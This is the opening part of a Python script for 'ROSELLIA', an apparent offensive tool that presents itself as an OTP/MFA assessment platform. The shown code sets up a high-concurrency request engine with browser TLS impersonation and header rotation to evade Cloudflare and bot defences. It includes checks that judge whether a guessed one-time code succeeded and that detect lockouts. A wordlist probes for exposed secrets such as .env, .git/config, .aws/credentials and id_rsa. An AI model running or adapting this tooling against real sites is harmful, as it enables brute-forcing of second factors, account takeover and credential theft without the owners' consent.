#!/usr/bin/env python3
import asyncio
import base64
import gzip
import hashlib
import hmac
import itertools
import json
import logging
import os
import random
import re
import shutil
import signal
import ssl
import statistics
import sys
import threading
import time
import xml.etree.ElementTree as ET
from collections import Counter, defaultdict
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import urljoin, urlparse, urlencode, parse_qs

try:
    import urllib3
    urllib3.disable_warnings()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

import warnings
warnings.filterwarnings("ignore")
logging.getLogger("curl_cffi").setLevel(logging.CRITICAL)

try:
    import aiohttp
except ImportError:
    sys.stderr.write("pip install aiohttp\n")
    sys.exit(1)

try:
    from curl_cffi.requests import AsyncSession as CurlAsync
    _HAVE_CURL = True
except ImportError:
    _HAVE_CURL = False

try:
    from curl_cffi import requests as curl_sync
    _HAVE_CURL_SYNC = True
except ImportError:
    _HAVE_CURL_SYNC = False

try:
    import requests
    from requests.adapters import HTTPAdapter
    _HAVE_REQ = True
except ImportError:
    _HAVE_REQ = False

try:
    import jwt as pyjwt
    _HAVE_JWT = True
except ImportError:
    _HAVE_JWT = False

try:
    import esprima
    _HAVE_ESPRIMA = True
except ImportError:
    _HAVE_ESPRIMA = False


def _silence_unraisable(unraisable):
    try:
        msg = str(unraisable.exc_value or "")
    except Exception:
        msg = ""
    if "Event loop is closed" in msg:
        return
    try:
        sys.__unraisablehook__(unraisable)
    except Exception:
        pass


sys.unraisablehook = _silence_unraisable


class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    NEON = "\033[38;5;46m"
    NEON2 = "\033[38;5;82m"
    NEON3 = "\033[38;5;118m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    PINK = "\033[38;5;213m"
    ORANGE = "\033[38;5;208m"
    MAGENTA = "\033[95m"
    GREY = "\033[38;5;242m"


BANNER = f"""{C.PINK}{C.BOLD}
    ██████╗  ██████╗ ███████╗███████╗██╗     ██╗ █████╗
    ██╔══██╗██╔═══██╗██╔════╝██╔════╝██║     ██║██╔══██╗
    ██████╔╝██║   ██║███████╗█████╗  ██║     ██║███████║
    ██╔══██╗██║   ██║╚════██║██╔══╝  ██║     ██║██╔══██║
    ██║  ██║╚██████╔╝███████║███████╗███████╗██║██║  ██║
    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝╚═╝  ╚═╝
{C.RESET}{C.NEON3}            Autonomous OTP / MFA Assessment Platform{C.RESET}
{C.GREY}      ─────────────────────────────────────────────────────{C.RESET}
{C.CYAN}         AUTHOR : SYLHETYHACKVENGER (THE-ERROR808){C.RESET}
{C.GREY}      ─────────────────────────────────────────────────────{C.RESET}
{C.GREY}      For authorized security assessments only.{C.RESET}
"""


def _w():
    try:
        return shutil.get_terminal_size(fallback=(80, 24)).columns
    except Exception:
        return 80


class Panel:
    def __init__(self):
        self.lock = threading.Lock()
        self.stats = {"requests": 0, "rps": 0.0, "hits": 0,
                      "cf": 0, "err": 0, "status": "init"}
        self._running = False
        self._thread = None

    def set(self, **kw):
        with self.lock:
            self.stats.update(kw)

    def _clear(self):
        sys.stdout.write("\r\033[K")

    def emit(self, color, tag, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        with self.lock:
            self._clear()
            print(f"{C.GREY}[{ts}]{C.RESET} "
                  f"{color}{C.BOLD}[{tag}]{C.RESET} {msg}",
                  flush=True)

    def data(self, label, value):
        with self.lock:
            self._clear()
            print(f"  {C.NEON}▸{C.RESET} "
                  f"{C.NEON2}{label:<26}{C.RESET}"
                  f"{C.NEON3}{value}{C.RESET}", flush=True)

    def section(self, name):
        w = _w()
        fill = max(2, w - len(name) - 5)
        with self.lock:
            self._clear()
            print(f"\n{C.PINK}{C.BOLD}╭─ {name} "
                  f"{'─' * fill}╮{C.RESET}", flush=True)

    def end_section(self):
        w = _w()
        with self.lock:
            self._clear()
            print(f"{C.PINK}{C.BOLD}╰{'─' * (w - 2)}╯{C.RESET}\n",
                  flush=True)

    def start_status(self):
        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        lt = time.monotonic()
        lr = 0
        while self._running:
            time.sleep(2)
            now = time.monotonic()
            with self.lock:
                req = self.stats["requests"]
                self.stats["rps"] = (req - lr) / max(0.1, now - lt)
                lt, lr = now, req
                s = dict(self.stats)
            w = _w()
            line = (f"\r{C.NEON}▸{C.RESET} "
                    f"{C.GREY}req{C.RESET}"
                    f"{C.NEON3}{s['requests']:<8}{C.RESET} "
                    f"{C.GREY}rps{C.RESET}"
                    f"{C.NEON2}{s['rps']:>7.1f}{C.RESET} "
                    f"{C.GREY}hits{C.RESET}"
                    f"{C.NEON3}{s['hits']:<4}{C.RESET} "
                    f"{C.GREY}cf{C.RESET}{s['cf']:<4} "
                    f"{C.GREY}err{C.RESET}{s['err']:<4} "
                    f"{C.GREY}st{C.RESET}"
                    f"{C.MAGENTA}{s['status']:<10}{C.RESET}")
            sys.stdout.write(line[:w - 1] + "\033[K")
            sys.stdout.flush()

    def stop_status(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)
        sys.stdout.write("\r\033[K")
        sys.stdout.flush()


PANEL = Panel()


def now_utc():
    return datetime.now(timezone.utc).isoformat()


def sha256_of(*parts):
    h = hashlib.sha256()
    for p in parts:
        h.update(str(p).encode())
    return h.hexdigest()


PII_PATTERNS = [
    r"[\w\.-]+@[\w\.-]+\.\w+",
    r"\b\d{3}-\d{2}-\d{4}\b",
    r"\b(?:\d[ -]*?){13,16}\b",
    r"\b\d{10,15}\b",
    r"\bAKIA[0-9A-Z]{16}\b",
    r"\bsk-[A-Za-z0-9]{32,}\b",
    r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+",
]


def extract_pii(text):
    found = set()
    for pat in PII_PATTERNS:
        for m in re.finditer(pat, text or ""):
            found.add(m.group(0)[:100])
    return list(found)[:10]


SEVERITY_ORDER = {"info": 0, "low": 1, "medium": 2, "high": 3,
                  "critical": 4}

SUCCESS_KEYS = {"ok", "success", "verified", "valid", "authenticated",
                "authorized", "logged_in", "loggedin", "confirmed",
                "accepted", "passed", "match", "matched", "correct"}
FAIL_KEYS = {"error", "err", "fail", "failed", "invalid",
             "incorrect", "denied", "unauthorized", "wrong",
             "expired", "locked", "mismatch", "blocked"}
SUCCESS_TEXT = ["welcome", "dashboard", "logged in", "signed in",
                "verified", "success", "authenticated", "access granted",
                "login successful", "otp verified", "code accepted",
                "verification complete"]
FAIL_TEXT = ["invalid", "incorrect", "failed", "expired", "wrong",
             "denied", "mismatch", "not valid", "too many",
             "locked", "blocked", "captcha", "recaptcha", "hcaptcha"]
LOCKOUT_TEXT = ["too many attempts", "account locked", "temporarily",
                "try again later", "rate limit", "blocked for",
                "suspicious activity", "verify you are human",
                "captcha", "recaptcha", "hcaptcha", "turnstile"]
CAPTCHA_MARKERS = ["g-recaptcha", "h-captcha", "cf-turnstile",
                   "recaptcha/api.js", "hcaptcha.com/1/api.js",
                   "challenges.cloudflare.com"]

AUTH_PAGE_MARKERS = ["sign in", "signin", "log in", "login",
                     "sign up", "signup", "register", "create account",
                     "create an account"]

STACKTRACE_HINTS = {
    "laravel": ["laravel", "ignition", "whoops", "symfony"],
    "django": ["django", "templatesyntaxerror", "csrftoken",
               "django.views"],
    "rails": ["rails", "actioncontroller", "activeRecord"],
    "express": ["express", "node_modules", "typeerror",
                "cannot read prop"],
    "flask": ["flask", "werkzeug", "jinja2"],
    "spring": ["springframework", "whitelabel error",
               "org.springframework"],
    "aspnet": ["system.web", "asp.net", "mscorlib"],
    "php": ["fatal error", "parse error", "stack trace", "on line"],
    "nextjs": ["__next_data__", "next/dist"],
    "nuxt": ["__nuxt__", "nuxt/dist"],
}

MISSING_FIELD_RE = re.compile(
    r"(?:missing|required|not provided|not present)[^\w]{0,10}"
    r"['\"`]?([\w\.\-]{2,40})['\"`]?", re.IGNORECASE)

TECH_HEADER_HINTS = {
    "x-vercel-id": "vercel",
    "x-amz-cf-id": "cloudfront",
    "x-fastly-request-id": "fastly",
    "x-azure-ref": "azure",
    "x-github-request-id": "github",
    "x-served-by": "fastly",
    "server-timing": "instrumented",
    "x-akamai-transformed": "akamai",
    "x-cache": "cache",
    "cf-ray": "cloudflare",
    "x-powered-by": None,
    "x-generator": None,
}


def is_auth_page(body):
    if not body:
        return False
    low = body.lower()
    if "<html" not in low and "<form" not in low:
        return False
    has_password = 'type="password"' in low or "type='password'" in low
    has_auth_word = any(w in low for w in AUTH_PAGE_MARKERS)
    return has_password and has_auth_word


def looks_json(resp):
    text = getattr(resp, "text", "") or ""
    ct = ""
    if hasattr(resp, "headers"):
        ct = resp.headers.get("Content-Type", "").lower()
    if "json" in ct:
        return True
    t = text.strip()
    if t.startswith("{") or t.startswith("["):
        try:
            json.loads(t)
            return True
        except Exception:
            return False
    return False


def json_success(payload):
    if not isinstance(payload, dict):
        return None
    for k in payload:
        kl = k.lower()
        if kl in SUCCESS_KEYS:
            v = payload[k]
            if isinstance(v, bool):
                return v
            if isinstance(v, (int, float)):
                return bool(v)
            if isinstance(v, str):
                return v.lower() in ("true", "1", "yes", "ok",
                                     "success", "verified", "valid",
                                     "authenticated", "confirmed")
        if kl in FAIL_KEYS:
            return False
    if "message" in payload and isinstance(payload["message"], str):
        m = payload["message"].lower()
        if any(w in m for w in SUCCESS_TEXT):
            return True
        if any(w in m for w in FAIL_TEXT):
            return False
    return None


def is_success(resp, baseline_hash=None, baseline_len=None):
    if resp is None:
        return False
    status = getattr(resp, "status", None) or \
        getattr(resp, "status_code", 0)
    if status in (301, 302, 303, 307, 308):
        loc = (getattr(resp, "headers", {}).get("Location", "")
               or "").lower()
        if any(w in loc for w in ("dashboard", "account", "home",
                                  "welcome", "profile", "success")):
            return True
        return False
    if status == 204:
        return True
    if status == 200:
        text = getattr(resp, "text", "") or ""
        content = getattr(resp, "content", b"") or b""
        if baseline_hash:
            if hashlib.sha256(content).hexdigest() == baseline_hash:
                return False
        try:
            j = json.loads(text)
            js = json_success(j)
            if js is True:
                return True
            if js is False:
                return False
        except Exception:
            pass
        tl = text.lower()
        if any(m in tl for m in SUCCESS_TEXT) and \
                not any(m in tl for m in FAIL_TEXT):
            return True
        if baseline_len and len(content) > baseline_len + 100:
            if not any(m in tl for m in FAIL_TEXT):
                return True
    return False


def is_cf_block(resp):
    if resp is None:
        return False
    status = getattr(resp, "status", None) or \
        getattr(resp, "status_code", 0)
    if status in (403, 429, 503):
        text = (getattr(resp, "text", "") or "")[:4000].lower()
        for marker in ("cloudflare", "cf-ray", "cf-chl",
                       "attention required", "just a moment",
                       "checking your browser", "ddos protection",
                       "ray id"):
            if marker in text:
                return True
        if "cloudflare" in str(
                getattr(resp, "headers", {}).get("Server", "")
        ).lower():
            return True
    return False


def is_lockout(resp):
    if resp is None:
        return False
    status = getattr(resp, "status", None) or \
        getattr(resp, "status_code", 0)
    text = (getattr(resp, "text", "") or "").lower()
    if status == 429:
        return True
    for marker in LOCKOUT_TEXT:
        if marker in text:
            return True
    return False


def has_captcha(html):
    if not html:
        return False
    low = html.lower()
    return any(m in low for m in CAPTCHA_MARKERS)


def is_real_redirect_to(location, attacker_host):
    if not location:
        return False
    try:
        u = urlparse(location)
        if not u.hostname:
            return False
        return u.hostname.lower() == attacker_host.lower()
    except Exception:
        return False


def detect_stacktrace(text):
    if not text:
        return None
    low = text.lower()
    for name, hints in STACKTRACE_HINTS.items():
        if any(h in low for h in hints):
            return name
    return None


def extract_missing_fields(text):
    if not text:
        return []
    found = []
    for m in MISSING_FIELD_RE.finditer(text):
        f = m.group(1).strip()
        if f and f.lower() not in [x.lower() for x in found]:
            found.append(f)
    return found


UA_PROFILES = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9", "en-US,en;q=0.8",
    "en-US,en;q=0.9,es;q=0.8", "en-US,en;q=0.9,fr;q=0.8",
    "en-US,en;q=0.9,de;q=0.8", "en-US,en;q=0.9,ja;q=0.8",
    "en-GB,en;q=0.9", "en-CA,en;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.8",
]

CURL_IMPERSONATE = ["chrome124", "chrome123", "chrome120",
                    "chrome110", "safari17_0", "firefox133"]


def random_headers(extra=None):
    h = {
        "User-Agent": random.choice(UA_PROFILES),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "DNT": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Sec-GPC": "1",
    }
    if extra:
        h.update(extra)
    return h


@dataclass
class AsyncResp:
    status: int
    text: str
    content: bytes
    headers: dict


class AsyncEngine:
    def __init__(self, concurrency=200, timeout=8, verbose=False,
                 use_curl=True):
        self.concurrency = concurrency
        self.timeout = timeout
        self.session = None
        self.curl_session = None
        self.sent = 0
        self.cf = 0
        self.err = 0
        self.stop = False
        self.verbose = verbose
        self.use_curl = use_curl and _HAVE_CURL
        self._lock = asyncio.Lock()

    async def start(self):
        if self.use_curl:
            try:
                self.curl_session = CurlAsync(
                    impersonate=random.choice(CURL_IMPERSONATE),
                    timeout=self.timeout)
                PANEL.emit(C.NEON, "ENGINE",
                           "curl_cffi TLS impersonation active")
            except Exception as e:
                PANEL.emit(C.YELLOW, "ENGINE",
                           f"curl_cffi failed ({e}) — fallback aiohttp")
                self.use_curl = False
                self.curl_session = None
        if not self.use_curl:
            conn = aiohttp.TCPConnector(
                limit=0, limit_per_host=0, ttl_dns_cache=300,
                use_dns_cache=True, enable_cleanup_closed=True,
                ssl=False)
            self.session = aiohttp.ClientSession(
                connector=conn,
                timeout=aiohttp.ClientTimeout(
                    total=self.timeout, connect=self.timeout / 2),
                cookie_jar=aiohttp.CookieJar(unsafe=True),
                trust_env=False)
            if not _HAVE_CURL:
                PANEL.emit(C.YELLOW, "ENGINE",
                           "curl_cffi not installed — using aiohttp")

    async def close(self):
        if self.session:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None
        if self.curl_session:
            try:
                await self.curl_session.close()
            except Exception:
                pass
            self.curl_session = None
        try:
            await asyncio.sleep(0.15)
        except Exception:
            pass

    async def request(self, method, url, json_body=None, data=None,
                      headers=None, allow_redirect=False):
        if self.stop:
            return None
        try:
            h = random_headers(headers)
            if self.curl_session is not None:
                kw = {"headers": h,
                      "allow_redirects": allow_redirect}
                if json_body is not None:
                    kw["json"] = json_body
                elif data is not None:
                    kw["data"] = data
                r = await self.curl_session.request(
                    method, url, **kw)
                resp = AsyncResp(
                    status=r.status_code,
                    text=r.text or "",
                    content=r.content or b"",
                    headers={k.lower(): v
                             for k, v in r.headers.items()})
            else:
                kw = {"headers": h, "allow_redirects": allow_redirect}
                if json_body is not None:
                    kw["json"] = json_body
                elif data is not None:
                    kw["data"] = data
                async with self.session.request(method, url, **kw) as r:
                    body = await r.read()
                    resp = AsyncResp(
                        status=r.status,
                        text=body.decode("utf-8", errors="replace"),
                        content=body,
                        headers={k.lower(): v
                                 for k, v in r.headers.items()})
            async with self._lock:
                self.sent += 1
                n = self.sent
            PANEL.set(requests=n)
            if is_cf_block(resp):
                async with self._lock:
                    self.cf += 1
                PANEL.set(cf=self.cf)
            return resp
        except Exception:
            async with self._lock:
                self.err += 1
            PANEL.set(err=self.err)
            return None


class RotatingSession:
    def __init__(self, timeout=10, verbose=False, use_curl=True):
        self.timeout = timeout
        self.sent = 0
        self._lock = threading.Lock()
        self.verbose = verbose
        self.history = []
        self.use_curl = use_curl and _HAVE_CURL_SYNC
        self.session = None

    def _get_session(self):
        if self.session is not None:
            return self.session
        if self.use_curl:
            try:
                self.session = curl_sync.Session(
                    impersonate=random.choice(CURL_IMPERSONATE),
                    timeout=self.timeout,
                    verify=False)
                PANEL.emit(C.NEON, "ENGINE",
                           "curl_cffi sync TLS impersonation active")
            except Exception:
                self.session = None
                self.use_curl = False
        if self.session is None and _HAVE_REQ:
            s = requests.Session()
            a = HTTPAdapter(pool_connections=20, pool_maxsize=20)
            s.mount("http://", a)
            s.mount("https://", a)
            s.verify = False
            self.session = s
        return self.session

    def _do(self, method, url, **kw):
        s = self._get_session()
        if s is None:
            return None
        kw["headers"] = random_headers(kw.get("headers"))
        kw.setdefault("timeout", self.timeout)
        if "allow_redirects" not in kw:
            kw["allow_redirects"] = False
        kw.pop("verify", None)
        try:
            r = s.request(method, url, **kw)
            with self._lock:
                self.sent += 1
                n = self.sent
            PANEL.set(requests=n)
            status = getattr(r, "status_code", None)
            content = getattr(r, "content", b"") or b""
            self.history.append({
                "method": method, "url": url,
                "status": status, "len": len(content),
                "ct": (r.headers.get("Content-Type", "")
                       if hasattr(r, "headers") else "")})
            return r
        except Exception:
            return None

    def get(self, url, **kw):
        return self._do("GET", url, **kw)

    def post(self, url, **kw):
        return self._do("POST", url, **kw)

    def request(self, method, url, **kw):
        return self._do(method, url, **kw)


@dataclass
class Finding:
    id: str
    title: str
    severity: str
    category: str
    endpoint: str
    description: str
    evidence: dict = field(default_factory=dict)
    remediation: str = ""
    cwe: str = ""

    def to_json(self):
        return asdict(self)


class Findings:
    def __init__(self):
        self.items = []
        self._n = 0
        self.lock = threading.Lock()

    def add(self, **kw):
        with self.lock:
            self._n += 1
            f = Finding(id=f"F{self._n:03d}", **kw)
            self.items.append(f)
            col = {"critical": C.RED, "high": C.ORANGE,
                   "medium": C.YELLOW, "low": C.CYAN,
                   "info": C.NEON}.get(f.severity, C.NEON)
            PANEL.emit(col, f.severity.upper()[:4],
                       f"{f.id} {f.title}")
            if f.evidence:
                try:
                    PANEL.emit(C.NEON2, " ev",
                               json.dumps(f.evidence,
                                          default=str)[:280])
                except Exception:
                    pass
            return f

    def by_severity(self, m="info"):
        t = SEVERITY_ORDER[m]
        return [f for f in self.items
                if SEVERITY_ORDER.get(f.severity, 0) >= t]


BUILTIN_WORDLIST = [
    "robots.txt", "sitemap.xml",
    ".well-known/security.txt",
    ".well-known/openid-configuration",
    ".well-known/oauth-authorization-server",
    ".well-known/jwks.json",
    ".well-known/webfinger", ".well-known/host-meta",
    ".well-known/nodeinfo", ".well-known/matrix/server",
    ".well-known/did.json",
    "swagger.json", "openapi.json", "api-docs",
    "v2/api-docs", "v3/api-docs", "graphql", "graphiql",
    ".git/HEAD", ".git/config", ".git/index", ".git/logs/HEAD",
    ".env", ".env.local", ".env.dev", ".env.prod", ".env.backup",
    ".env.production", ".env.development", ".env.staging",
    ".env.test", ".env.example",
    "config.json", "config.yaml", "config.yml", "config.js",
    "config.php", "config.php.bak", "appsettings.json",
    "phpinfo.php", "info.php", "test.php",
    "server-status", "server-info", ".htaccess", ".htpasswd",
    "actuator", "actuator/health", "actuator/env",
    "actuator/info", "actuator/loggers", "actuator/mappings",
    "actuator/beans", "actuator/configprops", "actuator/metrics",
    "actuator/trace", "actuator/httptrace", "actuator/heapdump",
    "api", "api/v1", "api/v2", "api/v3",
    "api/me", "api/users", "api/user", "api/account",
    "api/profile", "api/settings", "api/config",
    "api/status", "api/health", "api/version", "api/info",
    "api/docs", "api/swagger", "api/schema",
    "admin", "admin/", "admin/login", "admin.php",
    "administrator", "administrator/", "manage", "management",
    "login", "register", "signup", "sign-up", "signin", "sign-in",
    "health", "healthz", "status", "version", "metrics",
    "debug", "debug/vars", "debug/pprof", "console",
    ".DS_Store", "backup.zip", "backup.tar.gz", "backup.sql",
    "db.sql", "database.sql", "dump.sql",
    "crossdomain.xml", "clientaccesspolicy.xml", "cgi-bin/",
    "wp-login.php", "wp-admin", "wp-json/wp/v2/users",
    "wp-config.php", "wp-config.php.bak", "xmlrpc.php",
    ".well-known/apple-app-site-association",
    ".well-known/assetlinks.json",
    "oauth/authorize", "oauth/token", "oauth/revoke",
    "oauth/introspect", "oauth/userinfo",
    ".aws/credentials", ".aws/config",
    ".docker/config.json", "Dockerfile", "docker-compose.yml",
    "package.json", "package-lock.json", "composer.json",
    "composer.lock", "yarn.lock", "Gemfile", "Gemfile.lock",
    "requirements.txt", "Pipfile", "Pipfile.lock",
    ".gitignore", ".svn/entries", ".hg/hgrc",
    "WEB-INF/web.xml", "META-INF/MANIFEST.MF",
    "trace", "echo",
    "manifest.json", "asset-manifest.json",
    "static/js/main.js", "static/js/main.chunk.js",
    "main.js", "app.js", "bundle.js",
    "assets/index.js", "js/app.js", "js/main.js",
    "favicon.ico", "logo.png", "logo.svg",
    "otp", "otp/request", "otp/verify", "otp/send",
    "otp/check", "otp/validate", "otp/submit", "otp/confirm",
    "mfa", "mfa/request", "mfa/verify", "mfa/send",
    "mfa/check", "mfa/validate", "mfa/submit", "mfa/confirm",
    "mfa/challenge", "mfa/setup", "mfa/enable", "mfa/disable",
    "2fa", "2fa/request", "2fa/verify", "2fa/send",
    "2fa/check", "2fa/validate", "2fa/submit", "2fa/confirm",
    "2fa/setup", "2fa/enable", "2fa/disable",
    "auth", "auth/login", "auth/register", "auth/logout",
    "auth/otp", "auth/otp/request", "auth/otp/verify",
    "auth/mfa", "auth/mfa/request", "auth/mfa/verify",
    "auth/2fa", "auth/2fa/request", "auth/2fa/verify",
    "auth/challenge", "auth/verify", "auth/recovery",
    "auth/refresh", "auth/token", "auth/session",
    "api/otp/request", "api/otp/verify", "api/otp/send",
    "api/otp/check", "api/otp/validate",
    "api/mfa/request", "api/mfa/verify", "api/mfa/send",
    "api/mfa/check", "api/mfa/validate", "api/mfa/challenge",
    "api/2fa/request", "api/2fa/verify",
    "api/auth/otp/request", "api/auth/otp/verify",
    "api/auth/mfa/request", "api/auth/mfa/verify",
    "api/auth/2fa/request", "api/auth/2fa/verify",
    "api/auth/challenge", "api/auth/verify", "api/auth/login",
    "api/auth/register", "api/auth/refresh", "api/auth/token",
    "api/v1/otp/request", "api/v1/otp/verify",
    "api/v1/auth/otp/request", "api/v1/auth/otp/verify",
    "api/v1/auth/mfa/request", "api/v1/auth/mfa/verify",
    "api/v2/otp/request", "api/v2/otp/verify",
    "api/v2/auth/otp/request", "api/v2/auth/otp/verify",
    "v1/otp/request", "v1/otp/verify",
    "v2/otp/request", "v2/otp/verify",
    "login/otp", "login/verify", "login/mfa", "login/2fa",
    "login/challenge", "login/2fa/verify",
    "verify-otp", "verify-mfa", "verify-2fa", "verify-code",
    "confirm-otp", "confirm-mfa", "confirm-code",
    "check-otp", "check-code", "validate-otp", "validate-code",
    "submit-otp", "submit-code", "submit-2fa",
    "send-otp", "send-code", "request-code", "request-otp",
    "issue-otp", "generate-otp", "resend-otp", "resend-code",
    "password", "password/reset", "password/reset/request",
    "password/reset/verify", "password/forgot",
    "forgot-password", "reset-password", "reset/request",
    "reset/verify", "api/password/reset/request",
    "api/password/reset/verify", "api/password/forgot",
    "api/password/reset", "api/account/recovery",
    "api/account/verify", "account/recovery",
    "account/verify", "account/2fa", "account/mfa",
    "security", "security/2fa", "security/mfa",
    "settings", "settings/2fa", "settings/mfa",
    "settings/security", "users", "users/me",
    "users/me/2fa", "users/me/mfa", "user", "user/2fa",
    "user/mfa", "user/verify", "user/profile",
    "user/settings", "account", "account/profile",
    "account/settings", "account/security",
    "dashboard", "profile", "settings/profile",
    "api/orders", "api/cart", "api/checkout",
    "api/products", "api/catalog", "api/search",
    "api/notifications", "api/messages",
    "api/invoices", "api/payments",
    "api/subscriptions", "api/plans",
    "api/webhook", "api/webhooks",
    "api/upload", "api/download", "api/files",
    "api/export", "api/import",
    "api/callback", "api/callbacks",
    "api/oauth", "api/oauth/token",
    "api/session", "api/sessions",
    "api/token", "api/tokens",
    "api/refresh", "api/refresh-token",
    "api/revoke", "api/logout",
    "v1", "v2", "v3",
    "v1/auth", "v2/auth", "v3/auth",
    "v1/users", "v2/users", "v3/users",
    "v1/login", "v2/login", "v3/login",
    "v1/register", "v2/register", "v3/register",
    "v1/verify", "v2/verify", "v3/verify",
    "v1/otp", "v2/otp", "v3/otp",
    "v1/mfa", "v2/mfa", "v3/mfa",
    "app", "app/login", "app/register",
    "mobile", "mobile/login", "mobile/register",
    "internal", "internal/health", "internal/metrics",
    "internal/debug", "internal/status",
    "private", "private/health",
    "static", "static/", "public", "public/",
    "uploads", "uploads/", "files", "files/",
    "logs", "logs/", "tmp", "tmp/",
    "backup", "backups", "backup/",
    "old", "old/", "test", "test/", "dev", "dev/",
    "staging", "staging/", "prod", "prod/",
    "demo", "demo/", "sandbox", "sandbox/",
    "beta", "beta/", "alpha", "alpha/",
    "assets/images", "assets/css", "assets/js",
    "images", "css", "js", "fonts", "media",
    "wp-content", "wp-content/uploads",
    "wp-includes", "wp-admin/", "wp-json",
    "swagger-ui.html", "swagger-ui/",
    "redoc", "redoc.html",
    "docs", "docs/", "documentation",
    "status", "uptime", "healthcheck",
    "ping", "pong", "alive",
    "version", "versions", "changelog",
    "release", "releases", "build",
    "info", "system", "env",
    "phpmyadmin", "adminer",
    "manager/html", "manager/status",
    "jmx-console", "web-console", "invoker",
    "axis2", "axis2/services", "cxf",
    "soap", "soap/service", "wsdl",
    "humans.txt", "security.txt",
    "README.md", "CHANGELOG.md",
    "LICENSE", "LICENSE.txt",
    "robots", "sitemap",
    "apple-touch-icon.png",
    "manifest.webmanifest",
    "service-worker.js",
    "sw.js", "workbox-sw.js",
    "browserconfig.xml",
    "web.config", "web.config.bak",
    "nginx.conf", "nginx.conf.bak",
    "htaccess", "htpasswd",
    "id_rsa", "id_rsa.pub",
    "authorized_keys", "known_hosts",
]


def load_wordlist(path=None):
    if path and Path(path).exists():
        try:
            lines = Path(path).read_text(errors="ignore").splitlines()
            return [l.strip().lstrip("/") for l in lines
                    if l.strip() and not l.startswith("#")]
        except Exception:
            pass
    return [l.lstrip("/") for l in BUILTIN_WORDLIST]


@dataclass
class Endpoint:
    path: str
    method: str = "GET"
    status: int = 0
    size: int = 0
    source: str = ""
    noise: bool = False


API_URL_PATTERNS = [
    r'["\'](/api/[a-zA-Z0-9_/\-\.%]+)["\']',
    r'["\'](/v[0-9]+/[a-zA-Z0-9_/\-\.%]+)["\']',
    r'["\'](/auth/[a-zA-Z0-9_/\-\.%]+)["\']',
    r'fetch\(\s*["\'`]([^"\'`]+)["\'`]',
    r'axios\.(?:get|post|put|delete|patch)\(\s*["\'`]([^"\'`]+)["\'`]',
    r'\.(?:get|post|put|delete|patch)\(\s*["\'`](/[^"\'`]+)["\'`]',
    r'url\s*:\s*["\'`]([^"\'`]+)["\'`]',
    r'path\s*:\s*["\'`]([^"\'`]+)["\'`]',
    r'endpoint\s*:\s*["\'`]([^"\'`]+)["\'`]',
    r'baseUrl\s*:\s*["\'`]([^"\'`]+)["\'`]',
    r'baseURL\s*:\s*["\'`]([^"\'`]+)["\'`]',
    r'["\'](https?://[^"\']+/(?:api|auth|otp|mfa|2fa)/[a-zA-Z0-9_/\-\.%]+)["\']',
]

TEMPLATE_LITERAL_RE = re.compile(r'`([^`]*\$\{[^}]+\}[^`]*)`')
TEMPLATE_VAR_VALUES = ["v1", "v2", "v3", "1", "2", "3"]

WEBPACK_CHUNK_RE = re.compile(
    r'__webpack_require__\.u\s*=\s*function\s*\(\s*\w+\s*\)\s*'
    r'\{\s*return\s*["\']([^"\']+)["\']\s*\+\s*'
    r'\{([^}]+)\}\s*\[\s*\w+\s*\]\s*\+\s*["\']([^"\']+)["\']',
    re.DOTALL)

VITE_MANIFEST_RE = re.compile(
    r'<script[^>]+type=["\']module["\'][^>]+src=["\'](/[^"\']+)["\']')

SOURCE_MAP_INLINE_RE = re.compile(
    r'//#\s*sourceMappingURL=data:application/json;(?:charset=[^;]+;)?'
    r'base64,([A-Za-z0-9+/=]+)')

SOURCE_MAP_EXTERNAL_RE = re.compile(
    r'//#\s*sourceMappingURL=([^\s]+\.map)')

OBFUSCATED_STRING_TABLE_RE = re.compile(
    r'var\s+(_0x[a-f0-9]+)\s*=\s*\[([^\]]{50,})\]', re.IGNORECASE)

OBFUSCATED_REF_RE = re.compile(
